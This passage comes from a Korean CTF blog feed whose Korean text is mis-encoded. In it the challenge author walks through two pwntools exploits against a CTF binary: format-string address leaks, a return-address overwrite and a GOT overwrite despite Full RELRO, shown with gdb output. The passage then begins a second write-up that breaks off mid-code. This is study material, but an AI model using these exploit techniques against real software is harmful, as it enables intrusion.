Ï†úÌïúÌïòÍ≤å ÎêòÏóàÎã§.</p><p>ÎòêÌïú v8ÏùÑ ÏúÑÌïú nptr ÏûÖÎ†•ÎèÑ 0x14Î°ú ÌäπÎ≥ÑÌûà Ï†úÌïúÌïú Ïù¥Ïú†Í∞Ä ÏûàÎã§. Ïù¥ Í∏ÄÏùò Ïñ∏Ïù∏ÌÖêÏù¥ ÏïÑÎãå Îã§Ïùå Í∏ÄÏùò Ïñ∏Ïù∏ÌÖêÏùÑ ÏúÑÌï¥ÏÑúÎã§. (Ï∂úÏ†úÌï† ÎïåÎ∂ÄÌÑ∞ Ïù∏ÏßÄÌïòÍ≥† ÏûàÏóàÎçò Ïñ∏Ïù∏ÌÖêÏù¥Í≥† ÏùºÎ∂ÄÎü¨ ÏûÖÎ†• ÌÅ¨Í∏∞Î•º 0x14Î°ú ÎëêÍ≥† Ïñ∏Ïù∏ÌÖêÏùÑ Î∞©ÏßÄÌïòÏßÄ ÏïäÏïòÎã§.) </p><p>Ïù¥Ïóê Í¥ÄÌï¥ÏÑúÎäî Îã§Ïùå Í∏ÄÏóêÏÑú ÏÑ§Î™ÖÌïòÎèÑÎ°ù ÌïúÎã§.</p><h2 id="Vunlerability"><a href="#Vunlerability" class="headerlink" title="Vunlerability"></a>Vunlerability</h2><p>ÏïÑÎ¨¥Î¶¨ Î¥êÎèÑ bofÎäî ÌÑ∞ÏßÄÏßÄ ÏïäÎäîÎã§. ÏûÑÏùò Ï£ºÏÜå Ïì∞Í∏∞ÏôÄ Ïä§ÌÉù Ï£ºÏÜå leakÏùÑ Ïù¥Ïö©ÌïòÏó¨ ExploitÏùÑ ÏßÑÌñâÌï¥Î≥¥Ïûê.</p><p>Ïä§ÌÉùÏóê ÏûàÎäî Ï£ºÏÜåÎ•º Î™®Îëê Ï∂úÎ†•Ìï† Ïàò ÏûàÎã§Îäî Í≤ÉÏùÄ Í∞ïÎ†•Ìïú Ï∑®ÏïΩÏ†êÏù¥Îã§. pie base, libc base, stack address Îì±ÏùÑ Î∞îÎ°ú Íµ¨Ìï† Ïàò ÏûàÍ∏∞ ÎïåÎ¨∏Ïù¥Îã§.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>Ïù∏ÌÖêÍ≥º Ïñ∏Ïù∏ÌÖê ÌïòÎÇòÏî© ÏÜåÍ∞úÌïúÎã§. Ïù∏ÌÖêÏùÄ Ïä§ÌÉù retÎ•º gift Ìï®ÏàòÎ°ú ÎçÆÎäî Í≤ÉÏù¥Îã§. Ïù¥ Î¨∏Ï†úÎäî ÏòàÏÑ† Îïå ÎÉàÎçò Î¨∏Ï†úÎ•º ÏÇ¥Ïßù Î∞îÍøîÏÑú ÎÇ∏ Î¨∏Ï††Îç∞ ÏòàÏÑ† Îïå ÌíÄÏñ¥Ï£ºÏã† Î∂ÑÎì§Ïù¥ Î™®Îëê ÎòëÍ∞ôÏùÄ Î∞©Ïãù(Ïñ∏Ïù∏ÌÖê)ÏúºÎ°ú Ìë∏ÏÖîÏÑú Í∑∏ Î∂ÄÎ∂ÑÏùÑ Ìå®ÏπòÌï¥ÏÑú ÎÉàÎã§. </p><p>Î™©ÌëúÎäî 1. Ìå®ÏπòÎ•º ÌÜµÌï¥ ÏòàÏÑ† ÎïåÏùò Ïñ∏Ïù∏ÌÖê ÌíÄÏù¥Í∞Ä Î∂àÍ∞ÄÎä• Ìïú Í≤É, 2. Ìè¨ÎÑàÎ∏î Ïò¨ÌÅ¥ Î∞©ÏßÄ ÏòÄÎã§. ÏòàÏÑ† ÎïåÏùò Ïñ∏Ïù∏ÌÖêÏùÄ main Ìï®ÏàòÍ∞Ä <code>return 0</code>ÏúºÎ°ú Ï¢ÖÎ£åÎêòÏñ¥ÏÑú Ïä§ÌÉù retÎ•º giftÌï®Ïàò Ï£ºÏÜåÎ°ú Î∞îÍøîÏÑú ÌíÄÏù¥ÌïòÎäî Í≤ÉÏù¥Îã§. Ïù¥Í≤ÉÏùÑ Î∞©ÏßÄÌïòÍ∏∞ ÏúÑÌï¥ mainÏù¥ Ï¢ÖÎ£åÌïòÎäî Î∂ÄÎ∂ÑÏùÑ <code>exit(0)</code>ÏúºÎ°ú Î≥ÄÍ≤ΩÌïòÏòÄÎã§. Î≥∏ÏÑ† Î¨∏Ï†úÎ•º ÌíÄÏù¥Ìï† Îïå read Ìï®ÏàòÏùò retÎ•º ÎçÆÏßÄ ÏïäÍ≥† ÌíÄÏù¥Î•º ÌñàÏúºÎÇò Ìï¥Îãπ Î∞©ÏãùÏùÄ ÏùµÏä§ÌïòÎäîÎç∞ Ïò§Îûú ÏãúÍ∞ÑÏù¥ Í±∏Î†§ÏÑú Îã§Î•∏ ÏùµÏä§ Î∞©ÏãùÏùÑ ÌÉêÏÉâÌïòÏòÄÎã§. Í≤∞Íµ≠ ÏòàÏÑ† Ïñ∏Ïù∏ÌÖêÍ≥º ÎπÑÏä∑Ìïú Î∞©ÏãùÏùò ÌíÄÏù¥Î•º Î≥∏ÏÑ† Ïù∏ÌÖêÏúºÎ°ú Ï±ÑÌÉùÌïòÏòÄÎã§. Ïû¨Î∞åÎäî Í≤ÉÏùÄ ÎåÄÌöå ÎÅùÎÇòÍ≥† Ìï¥Îãπ Î¨∏Ï†úÎ•º ÌíÄÏù¥ÌïòÎ†§Í≥† ÌïòÏã† Î∂ÑÏùò ÏùµÏä§ ÏΩîÎìúÎ•º ÏÇ¥Ìé¥Î¥§ÎäîÎç∞ Ïù¥ Î∞©Î≤ïÏù¥ ÏïÑÎãàÎùº Îã§Î•∏ Î∞©Î≤ïÏúºÎ°ú ÏãúÎèÑÌïòÍ≥† Í≥ÑÏÖ®Îã§.. Ïù¥ Î∞©Î≤ïÎèÑ Ìï¥Îãπ Í∏ÄÏóê ÏÜåÍ∞úÌïòÎèÑÎ°ù ÌïòÍ≤†Îã§.</p><h2 id="Exploit-Scnario-1-intend"><a href="#Exploit-Scnario-1-intend" class="headerlink" title="Exploit Scnario 1 (intend)"></a>Exploit Scnario 1 (intend)</h2><ol><li>stack addressÎ•º Íµ¨Ìïú Îí§, loop ÌöüÏàò Î≥ÄÍ≤Ω</li><li>pie base Íµ¨ÌïòÍ∏∞</li><li>bufÎ•º read retÎ°ú Î≥ÄÍ≤Ω ÌõÑ gift ÏûÖÎ†• (read retÎ•º gift)</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;43.201.142.219&#x27;, 49166)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Buy</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Exchange</span>(<span class="params">addr, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(addr))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="comment"># [1]</span></span><br><span class="line">Buy(<span class="string">&#x27;%29$p&#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;stack leak :: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line"><span class="comment"># struct.unpack(&#x27;q&#x27;,(struct.pack(&#x27;i&#x27;,-1)+struct.pack(&#x27;i&#x27;,-10)))[0]</span></span><br><span class="line"><span class="comment"># -38654705665</span></span><br><span class="line">Exchange(stack_leak + <span class="number">0xb0</span>, -<span class="number">38654705665</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [2]</span></span><br><span class="line">Buy(<span class="string">&#x27;%39$p_&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;_&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>) - <span class="number">0x1277</span></span><br><span class="line">info(<span class="string">&#x27;pie base :: &#x27;</span> + <span class="built_in">hex</span>(e.address)) <span class="comment"># pie base</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [3]</span></span><br><span class="line">pause()</span><br><span class="line">Exchange(stack_leak + <span class="number">0xb8</span>, stack_leak - <span class="number">0x8</span>) <span class="comment"># buf -&gt; read ret</span></span><br><span class="line">Buy(p64(e.sym[<span class="string">&#x27;gift&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="loop-ÌöüÏàò-Î≥ÄÍ≤Ω"><a href="#loop-ÌöüÏàò-Î≥ÄÍ≤Ω" class="headerlink" title="loop ÌöüÏàò Î≥ÄÍ≤Ω"></a>loop ÌöüÏàò Î≥ÄÍ≤Ω</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import struct</span><br><span class="line">&gt;&gt;&gt; struct.pack(&#x27;i&#x27;, -1)</span><br><span class="line">b&#x27;\xff\xff\xff\xff&#x27;</span><br><span class="line">&gt;&gt;&gt; struct.pack(&#x27;i&#x27;, -10)</span><br><span class="line">b&#x27;\xf6\xff\xff\xff&#x27;</span><br><span class="line">&gt;&gt;&gt; struct.pack(&#x27;i&#x27;, -1) + struct.pack(&#x27;i&#x27;, -10)</span><br><span class="line">b&#x27;\xff\xff\xff\xff\xf6\xff\xff\xff&#x27;</span><br></pre></td></tr></table></figure><p>ÏúÑ Î∞îÏù¥Ìä∏ Î¨∏ÏûêÏó¥ÏùÑ long long intÎ°ú unpackÌïòÎ©¥ ÏïÑÎûòÏôÄ Í∞ôÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; struct.unpack(&#x27;q&#x27;, (struct.pack(&#x27;i&#x27;, -1) + struct.pack(&#x27;i&#x27;, -10)))</span><br><span class="line">(-38654705665,)</span><br></pre></td></tr></table></figure><p>Ï∞∏Í≥†Î°ú Íµ≥Ïù¥ loop ÌöüÏàòÎ•º Î≥ÄÍ≤ΩÌïòÏßÄ ÏïäÏïÑÎèÑ ÎêúÎã§. Í∑∏ Ïù¥Ïú†Îäî Ïö∞Î¶¨Îäî stackÍ≥º pieÎßå Íµ¨ÌïòÎ©¥ ÎêòÎäîÎç∞ fsbÍ∞Ä ÌÑ∞Ïßà Îïå Í∏ÄÏûê ÏàòÍ∞Ä Ï∂©Î∂ÑÌïòÍ∏∞ ÎïåÎ¨∏Ïù¥Îã§.</p><h2 id="Exploit-Scnario-2"><a href="#Exploit-Scnario-2" class="headerlink" title="Exploit Scnario 2"></a>Exploit Scnario 2</h2><ol><li>stack addressÎ•º Íµ¨Ìïú Îí§, loop ÌöüÏàò Î≥ÄÍ≤Ω</li><li>libc base Íµ¨ÌïòÍ∏∞</li><li>pie base Íµ¨ÌïòÍ∏∞</li><li><code>*ABS*@got.plt</code>Î•º gift Ìï®Ïàò Ï£ºÏÜåÎ°ú ÎçÆÍ∏∞ (got overwriting)</li></ol><h3 id="Exploit-Code-1"><a href="#Exploit-Code-1" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Buy</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Exchange</span>(<span class="params">addr, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(addr))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="comment"># [1]</span></span><br><span class="line">Buy(<span class="string">&#x27;%29$p&#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;stack leak :: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line"><span class="comment"># struct.unpack(&#x27;q&#x27;,(struct.pack(&#x27;i&#x27;,-1)+struct.pack(&#x27;i&#x27;,-10)))[0]</span></span><br><span class="line"><span class="comment"># -38654705665</span></span><br><span class="line">Exchange(stack_leak + <span class="number">0xb0</span>, -<span class="number">38654705665</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [2]</span></span><br><span class="line">pause()</span><br><span class="line">Buy(<span class="string">&#x27;%37$p_&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;_&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>) - <span class="number">0x23290</span></span><br><span class="line">info(<span class="string">&#x27;libc base :: &#x27;</span> + <span class="built_in">hex</span>(libc.address)) <span class="comment"># libc base</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [3]</span></span><br><span class="line">Buy(<span class="string">&#x27;%39$p_&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;_&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>) - <span class="number">0x1277</span></span><br><span class="line">info(<span class="string">&#x27;pie base :: &#x27;</span> + <span class="built_in">hex</span>(e.address)) <span class="comment"># pie base</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [4]</span></span><br><span class="line">abs_got = libc.address + <span class="number">0x1d8050</span></span><br><span class="line">info(<span class="string">&#x27;abs got :: &#x27;</span> + <span class="built_in">hex</span>(abs_got))</span><br><span class="line"></span><br><span class="line">Exchange(abs_got, e.sym[<span class="string">&#x27;gift&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="GOT-overwriting"><a href="#GOT-overwriting" class="headerlink" title="GOT overwriting"></a>GOT overwriting</h3><p>Full RELROÏûÑÏóêÎèÑ GOT overwritingÏù¥ Í∞ÄÎä•ÌïòÎã§.</p><p>putsÏùò Íµ¨ÌòÑ Ï¥àÎ∞òÎ∂ÄÎ•º gdbÏóêÏÑú ÌôïÏù∏ÌïòÎ©¥ ÏïÑÎûòÏôÄ Í∞ôÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x7fa31ab33aa0 &lt;puts&gt;:       endbr64</span><br><span class="line">0x7fa31ab33aa4 &lt;puts+4&gt;:     push   r14</span><br><span class="line">0x7fa31ab33aa6 &lt;puts+6&gt;:     push   r13</span><br><span class="line">0x7fa31ab33aa8 &lt;puts+8&gt;:     push   r12</span><br><span class="line">0x7fa31ab33aaa &lt;puts+10&gt;:    mov    r12,rdi</span><br><span class="line">0x7fa31ab33aad &lt;puts+13&gt;:    push   rbp</span><br><span class="line">0x7fa31ab33aae &lt;puts+14&gt;:    push   rbx</span><br><span class="line">0x7fa31ab33aaf &lt;puts+15&gt;:    sub    rsp,0x10</span><br><span class="line">0x7fa31ab33ab3 &lt;puts+19&gt;:    call   0x7fa31aae12b0 &lt;*ABS*+0x9d080@plt&gt;</span><br></pre></td></tr></table></figure><p><code>*ABS*+0x9d080@plt</code> ÏùÑ callÌïòÍ≥† ÏûàÎäîÎç∞, ÏïàÏóê Îì§Ïñ¥Í∞ÄÏÑú ÌôïÏù∏Ìï¥Î≥¥Î©¥ ÏïÑÎûòÏôÄ Í∞ôÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7fa31aae12b0 &lt;*ABS*+0x9d080@plt&gt;:  endbr64</span><br><span class="line">0x7fa31aae12b4 &lt;*ABS*+0x9d080@plt+4&gt;:        bnd jmp QWORD PTR [rip+0x1b5d95]        # 0x7fa31ac97050 &lt;*ABS*@got.plt&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gef‚û§  vm 0x7fa31ac97050</span><br><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x007fa31ac97000 0x007fa31ac99000 0x000000001d8000 rw- /usr/lib/libc.so.6</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>*ABS*@got.plt</code> Ï£ºÏÜåÎ•º Ï∞∏Ï°∞Ìï¥ÏÑú jmpÌïòÎØÄÎ°ú giftÎ°ú Î∞îÍøîÏÑú ÏùµÏä§ÌïòÎ©¥ Îê† ÎìØ ÌïòÎã§. ÌíÄÎ†êÎ°ú ÏûÑÏóêÎèÑ Î∂àÍµ¨ÌïòÍ≥† Ïì∞Í∏∞ Í∂åÌïúÏù¥ Ï°¥Ïû¨ÌïúÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fa31ac97050 &lt;*ABS*@got.plt&gt;: 0x00007fa31ac27920</span><br></pre></td></tr></table></figure><p>overwriting ÌõÑ.. <code>*ABS*@got.plt</code> Ï£ºÏÜåÏóê gift Ï£ºÏÜåÎ•º Ï†ÄÏû•ÏãúÌÇ¨ Ïàò ÏûàÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fa31ac97050 &lt;*ABS*@got.plt&gt;: 0x0000558eefe46257</span><br></pre></td></tr></table></figure><p>Ïù¥ ÌõÑÏóê <code>puts</code> Ìï®ÏàòÍ∞Ä Ïã§ÌñâÎêúÎã§Î©¥ gift Ìï®ÏàòÍ∞Ä Ïã§ÌñâÎê† Í≤ÉÏù¥Îã§.</p><h2 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h2><p>Demon ÌåÄÏúºÎ°úÏç® CTF Î¨∏Ï†úÎ•º Ï∂úÏ†úÌïú Í≤É Ï§ëÏóê Í∞ÄÏû• Í≥µÏùÑ Îì§ÏòÄÍ≥† Ïò§ÎûòÍ±∏Î†∏Îã§. ÏµúÏã† libcÎ•º Í∞ÄÏßÑ Î¨∏Ï†úÎäî ÎßéÏù¥ ÌíÄÏù¥Î•º ÏïàÌï¥Î¥êÏÑú Îëê Î≤àÏß∏ ÏùµÏä§ Î∞©Î≤ïÏùÄ Î™∞ÎûêÎã§. ÏÉàÎ°úÏö¥ Í≤ÉÏùÑ Î∞∞ÏõåÏÑú Í∏∞Î∂ÑÏù¥ Ï¢ãÎã§ :) Ïù¥ Î¨∏Ï†ú ÎçïÎ∂ÑÏóê ÏµúÏã† libcÎèÑ Î∂ÑÏÑùÏùÑ Ìï¥Î≥¥ÏïòÎäîÎç∞ Í¥ÄÎ†® ÎÇ¥Ïö©ÏùÄ Docs Ïπ¥ÌÖåÍ≥†Î¶¨Ïóê (Ïñ∏Ï††Í∞Ñ) ÏóÖÎéÉÌï† ÏòàÏ†ïÏù¥Îã§.</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> POXX </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FULL RELRO </tag>
            
            <tag> Power Of XX </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jade CTF 2022 - Guess game (Stack pivoting)</title>
      <link href="/221028-jadectf2022-guess_game/"/>
      <url>/221028-jadectf2022-guess_game/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(16&#x2F;630) solves</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">‚îú‚îÄ‚îÄ chall</span><br><span class="line">‚îî‚îÄ‚îÄ libc.so.6</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  fill_secret_buffer();</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Welcome to my game, choose any number between 1-10\n&quot;</span>, <span class="number">0x33</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Enter a number: &quot;</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v4 &gt; <span class="number">10</span> || v4 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">2</span>, <span class="string">&quot;Wrong number entered\n&quot;</span>, <span class="number">0x15</span>uLL);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (v4 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    odd_option();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    even_option();                              <span class="comment">// not vuln</span></span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Bye bye\n&quot;</span>, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main Ìï®ÏàòÏóêÏÑú Ïàò ÌïòÎÇòÎ•º ÏûÖÎ†•Î∞õÎäîÎç∞ 0Î∂ÄÌÑ∞ 9ÏÇ¨Ïù¥Ïùò Î≤îÏúÑÎßå Ïù∏Ï†ïÌïúÎã§. Í∑∏ Îã§Ïùå &amp; Ïó∞ÏÇ∞ÏùÑ ÏßÑÌñâÌïòÎäîÎç∞ ÏûÖÎ†• Í∞íÏù¥ ÌôÄÏàòÎùºÎ©¥ <code>odd_option()</code> Ìï®ÏàòÎ•º Ïã§ÌñâÌïòÍ≥† ÏïÑÎãàÎùºÎ©¥ <code>even_option()</code> Ìï®ÏàòÎ•º Ïã§ÌñâÌïúÎã§. ÌõÑÏûêÏùò Ìï®ÏàòÏóê Ï∑®ÏïΩÏ†êÏù¥ ÏóÜÍ∏∞ ÎïåÎ¨∏Ïóê Í∞ÑÎã®ÌïòÍ≤å Î®ºÏ†Ä ÏÇ¥Ìé¥Î≥¥Ïûê.</p><h4 id="1-even-option"><a href="#1-even-option" class="headerlink" title="1. even_option()"></a>1. even_option()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">even_option</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">108</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+6Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Enter your name: &quot;</span>, <span class="number">0x11</span>uLL);</span><br><span class="line">  fgets(s, <span class="number">100</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\r\n&quot;</span>)] = <span class="number">0</span>;</span><br><span 